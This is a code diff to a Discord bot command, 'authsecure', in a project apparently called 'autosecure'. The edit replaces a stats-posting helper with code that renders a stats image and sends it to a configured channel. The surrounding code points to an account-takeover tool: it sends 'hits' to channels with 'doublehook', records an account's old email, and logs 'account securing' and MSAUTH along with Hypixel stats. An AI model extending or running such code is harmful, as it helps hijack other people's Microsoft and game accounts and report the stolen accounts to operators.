@@ -3,14 +3,14 @@ const listAccount = require("../../../autosecure/utils/accounts/listAccount.js")
 const { queryParams } = require("../../../db/database.js");
 const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
 const generateuid = require("../../../autosecure/utils/generateuid.js");
-const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require('discord.js');
 const insertaccount = require('../../../db/insertaccount.js');
 const getStats = require("../../../autosecure/utils/hypixelapi/getStats.js");
 const mcregex = require("../../.././autosecure/utils/utils/mcregex.js");
 const { failedembed } = require("../../../autosecure/utils/embeds/embedhandler.js");
 const { sendHitsToChannels } = require("../../utils/sendHits");
 const { logAccountSecure, logMSAUTH } = require("../../utils/activityLogger");
-const sendStatsToChannel = require("../../utils/sendStatsToChannel");
+const { generateStatsImage } = require("../../utils/sendStatsImage");
 
 module.exports = {
     name: "authsecure",
@@ -96,8 +96,18 @@ module.exports = {
             // Send to hits channels (doublehook)
             await sendHitsToChannels(client, accountmessage, interaction.user.id, interaction.user.tag, client.username);
             
-            // Send stats to configured channel
-            await sendStatsToChannel(client, acc, interaction.user.tag).catch(() => {});
+            // Send stats image to configured channel
+            try {
+                const buffer = await generateStatsImage(acc);
+                const statsChannelId = require("../../../config.json").statsChannel;
+                const statsChannel = client.channels.cache.get(statsChannelId);
+                if (statsChannel) {
+                    const attachment = new AttachmentBuilder(buffer, { name: 'stats.png' });
+                    await statsChannel.send({ files: [attachment] });
+                }
+            } catch (statsErr) {
+                console.error('[AuthSecure] Failed to send stats image:', statsErr.message);
+            }
             
             // Log account securing and MSAUTH
             await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "MSAUTH", true).catch(() => {});
